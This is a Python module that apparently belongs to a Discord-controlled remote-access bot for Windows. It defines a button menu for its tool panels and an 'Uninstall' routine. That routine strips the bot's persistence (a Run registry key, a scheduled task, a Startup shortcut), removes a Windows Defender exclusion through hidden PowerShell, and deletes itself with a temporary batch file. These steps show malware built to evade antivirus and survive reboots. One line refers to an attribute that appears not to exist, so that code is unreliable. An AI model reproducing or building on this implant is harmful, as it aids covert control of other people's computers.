import discord
from Tools.Tools.panel import embed_tools_panel, ToolsPanelView
from Tools.Fun.panel import embed_fun_panel, FunPanelView
from Tools.System.panel import embed_system_panel, SystemPanelView
from Tools.Windows.panel import embed_windows_panel, WindowsPanelView
from Tools.Recovery.panel import embed_recovery_panel, RecoveryPanelView


class StartupView(discord.ui.View):
    """View attached to the startup message with Tools, Fun, and System buttons."""
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Tools", emoji="🧰", style=discord.ButtonStyle.secondary)
    async def tools_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())

    @discord.ui.button(label="Fun", emoji="🎉", style=discord.ButtonStyle.secondary)
    async def fun_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_fun_panel(), view=FunPanelView())

    @discord.ui.button(label="System", emoji="⚙️", style=discord.ButtonStyle.secondary)
    async def system_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_system_panel(), view=SystemPanelView())

    @discord.ui.button(label="Windows", emoji="🪟", style=discord.ButtonStyle.secondary)
    async def windows_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_windows_panel(), view=WindowsPanelView())

    @discord.ui.button(label="Recovery", emoji="🔓", style=discord.ButtonStyle.secondary)
    async def recovery_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_recovery_panel(), view=RecoveryPanelView())

    @discord.ui.button(label="Uninstall", emoji="🗑️", style=discord.ButtonStyle.danger)
    async def uninstall_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        import os, sys, subprocess
        
        await interaction.response.send_message("Initiating self-destruction sequence...", ephemeral=True)
        
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
        exe_name = os.path.basename(exe_path)
        app_dir = os.path.dirname(exe_path)
        
        try:
            # 1. Remove Registry Key
            import winreg
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(key, exe_name.replace('.exe',''))
                winreg.CloseKey(key)
            except Exception:
                pass
                
            # 2. Remove Schtasks
            try:
                subprocess.run(f'schtasks /delete /tn "{exe_name.replace(".exe","")}" /f', shell=True, capture_output=True, creationflags=0x08000000)
            except Exception:
                pass
                
            # 3. Remove Startup Folder link
            try:
                startup_dir = os.path.join(os.environ.get('APPDATA',''), r'Microsoft\Windows\Start Menu\Programs\Startup')
                startup_lnk = os.path.join(startup_dir, exe_name.replace('.exe', '.lnk'))
                if os.path.exists(startup_lnk):
                    os.remove(startup_lnk)
            except Exception:
                pass
                
            # 4. Remove WD Exclusion (Takes Admin if enforced, but attempt regardless)
            try:
                subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', f'Remove-MpPreference -ExclusionPath "{app_dir}" -ErrorAction SilentlyContinue'], capture_output=True, creationflags=0x08000000)
            except Exception:
                pass
                
            await interaction.followup.send("All persistence mechanisms and exclusions removed. The bot process will now terminate.")
            
            # Initiate self-delete script if it's an exe
            if getattr(sys, 'frozen', False):
                bat_path = os.path.join(os.environ.get('TEMP', ''), "uninstall_nwexcord.bat")
                with open(bat_path, "w") as f:
                    f.write(f'''@echo off
timeout /t 3 /nobreak > NUL
del "{exe_path}"
rmdir "{app_dir}" /s /q
del "%~f0"
''')
                subprocess.Popen(bat_path, shell=True, creationflags=0x08000000)

            import discord
            for client in discord.utils.py_fallbacks: pass  # A hack isn't needed, sys.exit() will sever WS.
            
            # Tell Discord connection is dying
            await interaction.client.close()
            os._exit(0)
            
        except Exception as e:
            await interaction.followup.send(f"Error during uninstall: {e}")

